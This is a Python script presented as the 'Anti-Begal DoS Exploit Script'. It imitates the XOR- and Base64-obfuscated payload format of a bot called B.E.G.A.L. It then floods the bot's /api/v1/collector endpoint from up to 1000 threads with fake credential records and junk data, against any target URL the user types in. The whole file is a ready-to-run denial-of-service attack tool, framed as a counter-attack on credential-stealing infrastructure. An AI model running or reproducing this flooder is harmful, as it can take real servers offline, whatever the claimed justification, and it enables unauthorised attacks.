import requests
import json
import base64
import uuid
import threading
import argparse
import time
import random
import string
from urllib.parse import urljoin

# ==================== PAYLOAD GENERATION LOGIC ====================
# This logic mimics the client-side data obfuscation used by the B.E.G.A.L bot.

def xor_cipher(data_bytes, key):
    """
    Applies a simple repeating-key XOR cipher to the data.
    This function works for both encryption and decryption.
    """
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    return bytes([b ^ key_bytes[i % key_len] for i, b in enumerate(data_bytes)])

def create_obfuscated_payload(key, bot_uuid, data_type="LOGIN_DATA", junk_size=1024):
    """
    Creates the final JSON payload to be sent to the /api/v1/collector endpoint.
    1. Creates an inner JSON object with a UUID and junk data.
    2. Encodes this JSON to bytes.
    3. "Encrypts" the bytes using the XOR cipher.
    4. Encodes the result in Base64.
    5. Wraps the Base64 string in the final outer JSON structure.
    """
    # 1. Create inner JSON object
    junk_data = ''.join(random.choices(string.ascii_letters + string.digits, k=junk_size))
    inner_payload = {
        "uuid": str(bot_uuid),
        "type": data_type,
        "platform": "Anti-Begal Exploit",
        "url": "https://localhost/poisoned",
        "creds": {
            "username": f"dos_user_{''.join(random.choices(string.ascii_lowercase, k=5))}",
            "password": "password"
        },
        "junk": junk_data
    }
    inner_payload_str = json.dumps(inner_payload)
    
    # 2. Encode to bytes
    inner_payload_bytes = inner_payload_str.encode('utf-8')
    
    # 3. Apply XOR cipher
    encrypted_bytes = xor_cipher(inner_payload_bytes, key)
    
    # 4. Encode to Base64
    encrypted_b64_str = base64.b64encode(encrypted_bytes).decode('utf-8')
    
    # 5. Wrap in the final JSON structure
    final_payload = {
        "data": encrypted_b64_str
    }
    
    return final_payload

# ==================== ATTACK LOGIC ====================

class DoSAttacker:
    def __init__(self, target_url, xor_key, num_threads):
        self.target_url = urljoin(target_url, "/api/v1/collector")
        self.xor_key = xor_key
        self.num_threads = num_threads
        self.session = requests.Session()
        self.requests_sent = 0
        self.errors = 0
        self.stop_event = threading.Event()

    def attack_worker(self):
        """The function run by each thread to continuously send requests."""
        while not self.stop_event.is_set():
            try:
                bot_uuid = uuid.uuid4()
                payload = create_obfuscated_payload(self.xor_key, bot_uuid)
                
                response = self.session.post(self.target_url, json=payload, timeout=5)
                
                if response.status_code == 200:
                    self.requests_sent += 1
                else:
                    self.errors += 1
            except requests.exceptions.RequestException:
                self.errors += 1
                time.sleep(1) # Pause if the server is not responding

    def start(self):
        """Starts the DoS attack."""
        print(f"[*] Starting DoS attack on {self.target_url} with {self.num_threads} threads.")
        print(f"[*] Using XOR Key: '{self.xor_key}'")
        print("[*] Press Ctrl+C to stop the attack.")

        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while not self.stop_event.is_set():
                time.sleep(1)
                print(f"\r[*] Requests Sent: {self.requests_sent} | Errors: {self.errors}", end="")
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user.")
            self.stop_event.set()
        
        for t in threads:
            t.join(timeout=1)
        print("[*] Attack finished.")

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    # Display a banner as requested
    print("\n" + "="*50)
    print("         Anti-Begal DoS Exploit Script")
    print("           coded by xsanlahci 2026")
    print("="*50 + "\n")

    # --- Interactive User Input ---
    
    # 1. Get Target
    target_url = input("insert target : ")

    # 2. Get XOR Key (with default)
    key = input("insert key (press Enter for default): ")
    if not key:
        key = "FLIPPER_SECURE_XOR_KEY_1337"
        print(f"[*] Using default key: {key}")

    # 3. Get Thread Count (with validation and default)
    while True:
        try:
            threads_str = input("insert Threads (1-1000, default: 50): ")
            if not threads_str:
                threads = 50
                break
            threads = int(threads_str)
            if 1 <= threads <= 1000:
                break
            else:
                print("[!] Invalid range. Please enter a number between 1 and 1000.")
        except ValueError:
            print("[!] Invalid input. Please enter a whole number.")
    
    print("-" * 50)

    # --- URL Processing ---
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
        print(f"[!] Scheme not provided. Defaulting to http. Full Target: {target_url}")
    
    print("-" * 50)

    # --- Attacker Initialization and Start ---
    attacker = DoSAttacker(
        target_url=target_url,
        xor_key=key,
        num_threads=threads
    )
    
    attacker.start()
